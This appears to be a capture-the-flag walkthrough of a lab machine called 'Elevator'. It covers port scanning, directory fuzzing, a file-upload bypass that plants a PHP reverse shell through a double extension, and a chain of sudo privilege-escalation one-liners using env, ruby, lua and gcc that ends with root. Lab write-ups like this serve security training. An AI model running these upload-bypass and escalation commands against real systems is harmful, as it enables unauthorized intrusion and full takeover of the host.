# Elevator
![image](https://github.com/user-attachments/assets/94e48dad-afd1-4617-9218-7f59701415d5)

## Recognition and Enumeration.

Check that the machine is running.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Once we get a ping response, we can start enumerating the machine. The ttl=64 can tell us that it is a **Linux** machine.

We launch nmap to see what ports it finds.

```bash
sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
```
- `-sS`: Performs a SYN scan.
- `-p-`: Scans all ports.
- `--open`: Shows only open ports.
- `--min-rate 5000`: Sets the minimum packet forwarding rate to 5000 per second.
- `-vvv`: Generates very verbose and detailed output.
- `-n`: Prevents reverse DNS resolution.
- `-Pn`: Skips host discovery.
- `-oG allPorts`: Saves results to a file named "allPorts".
- `172.17.0.2`: The IP address of the target host.
```
```
PORT STATE SERVICE REASON
80/tcp open http syn-ack ttl 64
```
Since we have port 80 open, we are going to visit the web to see if we can find something that can help us, but there is nothing relevant, so we fuzz to find new routes.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php
```
![image](https://github.com/user-attachments/assets/bd15383a-3374-4318-b93d-c976cb398283)

Since we didn't find anything, we continue searching in directories, in this case we go to the directory **http://172.17.0.2/themes/**

![image](https://github.com/user-attachments/assets/0f497aa0-9c13-4687-a06d-44425ca59927)

## Exploitation.

We find a path **http://172.17.0.2/themes/file.html**, and we find a page to upload files. It tells us that only *jpg* files can be uploaded.

![image](https://github.com/user-attachments/assets/ce863652-ac2a-44dd-be7f-0c0b560d18ee)

To skip this check we can upload a shell in php that has a jpg extension. That is, it would be *shell.php.jpg* To do this we go to [GitHub](https://github.com/pentestmonkey/php-reverse-shell) and use its reverse shell in php.

![image](https://github.com/user-attachments/assets/83c89a3b-94f7-4f55-92be-e6435c594ea0)

![image](https://github.com/user-attachments/assets/e93f87e5-9673-431f-9025-cc0d0ec15b12)

We listen on the port we have configured, in my case 4444, and go to the route it shows us.

![image](https://github.com/user-attachments/assets/69e9ddc2-8b9c-42dc-b3c1-9b8dfd706ead)

## Privilege escalation.

Now we check the sudo permissions we have and see that we can run as **daphne** */usr/bin/evn*

![image](https://github.com/user-attachments/assets/1719d5ac-1ced-4f05-a376-08cfbeb15164)

```bash
sudo -u daphne /usr/bin/env /bin/sh
```
![image](https://github.com/user-attachments/assets/c6d6a982-e070-48df-b936-9e4bf483951d)

![image](https://github.com/user-attachments/assets/5313f360-4a38-4787-805b-fdc328e45ac9)

```bash
sudo -u vilma /usr/bin/ash
```
![image](https://github.com/user-attachments/assets/595b5be4-d24b-447c-9cc5-f51cca2e2665)

```bash
sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'
```
![image](https://github.com/user-attachments/assets/1dee18d8-7bc6-4699-8b61-8f53a11179be)

```bash
sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'
```
![image](https://github.com/user-attachments/assets/07f5fb76-616f-49c3-83f0-9be336555625)

```bash
sudo -u scooby /usr/bin/gcc -wrapper /bin/sh,-s .
```
![image](https://github.com/user-attachments/assets/9f81a2e6-401e-4e9c-9732-cfcc1fd0bdfe)

```bash
sudo -u root /usr/bin/sudo /bin/sh
```

![image](https://github.com/user-attachments/assets/afcb909f-242b-42e7-a958-92d505d5c7b8)

We already have access as **root**.
